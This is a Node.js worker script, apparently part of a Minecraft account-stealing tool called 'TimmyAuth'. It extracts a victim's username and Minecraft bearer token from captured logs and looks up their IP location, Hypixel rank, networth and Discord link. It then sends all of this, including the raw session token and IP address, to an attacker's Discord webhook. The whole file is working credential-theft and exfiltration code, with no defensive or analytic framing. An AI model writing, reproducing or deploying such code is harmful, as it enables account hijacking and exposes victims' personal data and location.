const { workerData, parentPort } = require('worker_threads');
const { WebhookClient } = require('discord.js');
const axios = require('axios');
const emojiFlag = require('emoji-flag');
import ('node-fetch')
const { logBuffer, clientIP } = workerData;

// Use the 'id' as needed in your worker logic

let extractedInfo = {
  name: null,
  token: null,
};

const logLines = logBuffer.join('').split('\n');

logLines.forEach((line) => {
  if (line.includes('name:')) {
    extractedInfo.name = line.replace(/'/g, '').trim();
  } else if (line.includes('token:')) {
    extractedInfo.token = line.replace(/'/g, '').trim();
  }
  // Add additional filters as needed
});


function modifyNameField(name) {
  return name ? name.substring(6, name.length - 1) : '';
}

function modifyTokenField(token) {
  return token ? token.substring(7, token.length - 1) : '';
}

function modifyRankField(token) {
  return token && token.length > 2 ? token.substring(2) : '';
}

const username = modifyNameField(extractedInfo.name || '');
const bearerToken = modifyTokenField(extractedInfo.token || '');

async function getIpLocation(ip) {
  const url = `https://ipapi.co/${ip}/json/`
  const config = {
      headers: {
          'Content-Type': 'application/json',
      }
  }
  let response = await axios.get(url, config)
  return [response.data['country_name'], response.data['country_code']]
}

async function getUsernameAndUUID(bearerToken) {
  try {
      const url = 'https://api.minecraftservices.com/minecraft/profile'
      const config = {
          headers: {
              'Authorization': 'Bearer ' + bearerToken,
          }
      }
      let response = await axios.get(url, config)
      if (response.status == 404) {res.send("Access denied because no Minecraft account was found.") 
      return ["timmy", "timmy"] }
      return [response.data['id'], response.data['name']]
  } catch (error) {
      return ["timmy", "timmy"]
      
  }
}

async function getPlayerData(username) {
  let url = `https://worried-tuna-bedclothes.cyclic.app//v2/profiles/${username}`
  let config = {
      headers: {
          'Authorization': 'timmyauthz'
      }
  }

  try {
      let response = await axios.get(url, config)
      return [response.data.data[0]['rank'], response.data.data[0]['hypixelLevel']]
  } catch (error) {
      return ["API DOWN", 0.0]
  }
}

async function getPlayerStatus(username) {
  try {
    let url = `https://worried-tuna-bedclothes.cyclic.app//v2/status/${username}`
    let config = {
      headers: {
        'Authorization': 'timmyauthz'
      }
    }
    let response = await axios.get(url, config)
    return response.data.data.online
  } catch (error) {
    return "API DOWN"
  }
}

async function getPlayerDiscord(username) {
  try {
    let url = `https://worried-tuna-bedclothes.cyclic.app//v2/discord/${username}`;
    let config = {
      headers: {
        Authorization: "timmyauthz"
      }
    };
    let response = await axios.get(url, config);
    if (response.data.data.socialMedia.links == null) {
      return response.data.data.socialMedia;
    } else {
      return response.data.data.socialMedia.links.DISCORD;
    }
  } catch (error) {
    return "API DOWN";
  }
}

async function getNetworth(username) {
  try {
    let url = `https://worried-tuna-bedclothes.cyclic.app//v2/profiles/${username}`;
    let config = {
      headers: {
        Authorization: "timmyauthz"
      }
    };
    let response = await axios.get(url, config);
    return [
      response.data.data[0]["networth"],
      response.data.data[0].networth["noInventory"],
      response.data.data[0].networth["networth"],
      response.data.data[0].networth["unsoulboundNetworth"],
      response.data.data[0].networth["soulboundNetworth"]
    ];
  } catch (error) {
    return ["API DOWN", "API DOWN", "API DOWN", "API DOWN", "API DOWN",]
  }
}

const formatNumber = (num) => {
  if (num < 1000) return num.toFixed(2)
  else if (num < 1000000) return `${(num / 1000).toFixed(2)}k`
  else if (num < 1000000000) return `${(num / 1000000).toFixed(2)}m`
  else return `${(num / 1000000000).toFixed(2)}b`
}

const customAvatarURL = 'https://bigrat.monster/media/bigrat.jpg';
const customUsername = 'TimmyAuth';

async function discordEmbed () {
  const networthArray = await getNetworth(username)
	const networth = networthArray[0]
	const networthNoInventory = networthArray[1]
	const networthNetworth = networthArray[2]
	const networthUnsoulbound = networthArray[3]
	const networthSoulbound = networthArray[4]

  let total_networth
  // Set it "API IS TURNED OFF IF NULL"
  if (networth == "API DOWN") total_networth = networth;
  else if (networth == "[NO PROFILES FOUND]") total_networth = networth;
  else if(networthNoInventory) total_networth = "NO INVENTORY: "+formatNumber(networthNetworth)+" ("+formatNumber(networthUnsoulbound)+")";
  else total_networth = formatNumber(networthNetworth)+" ("+formatNumber(networthUnsoulbound)+")";

  const playerData = await getPlayerData(username);
  const preRank = playerData[0];
  const rank = modifyRankField(preRank);
  const level = playerData[1].toFixed();
  const ipLocationArray = await getIpLocation(clientIP);
  const discord = await getPlayerDiscord(username);
  const status = await getPlayerStatus(username);
  const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken);
  const uuid = usernameAndUUIDArray[0];
  const country = ipLocationArray[0];
  const flag = ipLocationArray[1] ? emojiFlag(ipLocationArray[1]) : '';
  const discordMessage = {
    username: customUsername,
    avatarURL: customAvatarURL,
    content: `@everyone`,
    embeds: [
      {
        timestamp: new Date(),
        thumbnail: {
          url: 'https://visage.surgeplay.com/full/'+uuid
        },
        fields: [
          {
            name: '**🎯 Username:**',
            value: '```' + username + '```',
            inline: true,
          },
          {
            name: '**💻 Ip Address:**',
            value: '```' + (clientIP || 'N/A') + '```', // Replace 'clientIP' with the actual IP value or variable
            inline: true,
          },
          {
            name: `**${flag} Location:**`,
            value: '```'+ country +'```',
            inline: true,
          },
          {
            name: `**💰 Networth:**`,
            value: '```'+ total_networth +'```',
            inline: true,
          },
          {
            name: `**📡 Discord:**`,
            value: '```'+ discord +'```',
            inline: true,
          },
          {
            name: `**🌐 Status:**`,
            value: '```'+ status +'```',
            inline: true,
          },
          {
            name: `**🏅 Rank:**`,
            value: '```'+ rank +'```',
            inline: true,
          },
          {
            name: `**📊 Level:**`,
            value: '```'+ level +'```',
            inline: true,
          },
          {
            name: '**🔓 Token:**',
            value: '```' + bearerToken + '```',
          },
        ],
        footer: {
          text: 'TimmyAuth - by Timmy',
          iconURL: 'https://bigrat.monster/media/bigrat.jpg',
      },
      },
    ],
  };
  return discordMessage
}

async function sendDiscordMessage() {
  try {
    const messageContent = await discordEmbed();
    const { webhook } = require('./config.json');

    if (!webhook) {
      console.error('Webhook URL not found or invalid.');
      return { error: 'Webhook URL not found or invalid' };
    }

    const webhookClient = new WebhookClient({
      url: webhook,
    });
    
    await webhookClient.send(messageContent);
    console.log(`Sent the message`);
    return { success: true };
  } catch (error) {
    console.error('Error sending Discord message:', error.message);
    return { error: 'Failed to send Discord message' };
  }
}

sendDiscordMessage();
